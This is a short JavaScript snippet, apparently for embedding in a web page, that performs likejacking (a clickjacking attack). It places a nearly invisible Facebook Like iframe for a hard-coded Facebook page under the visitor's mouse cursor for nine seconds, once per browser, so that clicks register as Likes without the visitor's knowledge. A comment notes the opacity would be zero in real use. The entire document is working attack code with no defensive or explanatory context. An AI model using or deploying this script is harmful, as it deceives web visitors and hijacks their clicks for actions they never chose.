(function(){

var alerted = localStorage.getItem('alertednew2') + '';

    if (alerted != 'nullyesyes') {
	localStorage.setItem('alertednew2',localStorage.getItem('alertednew2') + 'yes');
	
  var tempX = 0,
  tempY = 0,
  IE = document.all ? true : false;
  
  if (!IE) document.captureEvents(Event.MOUSEMOVE);
  
  var like = document.createElement('iframe');
  like.src = 'http://www.facebook.com/plugins/like.php?href=' + encodeURIComponent(/*document.location.href*/ 'https://www.facebook.com/lafgafcom/') + '&amp;layout=standard&amp;show_faces=true&amp;width=53&amp;action=like&amp;colorscheme=light&amp;height=80';
  like.scrolling = 'no';
  like.frameBorder = 0;
  like.allowTransparency = 'true';
  like.style.border = 0;
  like.style.overflow = 'hidden';
  like.style.cursor = 'pointer';
  like.style.width = '5px';
  like.style.height =  '5px';
  like.style.position = 'absolute';
  like.style.opacity = .1; //Would be 0 if really used
  document.getElementsByTagName('body')[0].appendChild(like);
  
  window.addEventListener('mousemove', mouseMove, false);
  
  setTimeout(function(){
    document.getElementsByTagName('body')[0].removeChild(like);
    window.removeEventListener('mousemove', mouseMove, false);

  }, 9000);
  
  function mouseMove(e) {
    if (IE) {
      tempX = event.clientX + document.body.scrollLeft;
      tempY = event.clientY + document.body.scrollTop;
    } else {
      tempX = e.pageX;
      tempY = e.pageY;
    }
    
    if (tempX < 0) tempX = 0;
    if (tempY < 0) tempY = 0;
    
    like.style.top = (tempY - -0) + 'px';
    like.style.left = (tempX - 3) + 'px';
    
    return true
  }
  }
})();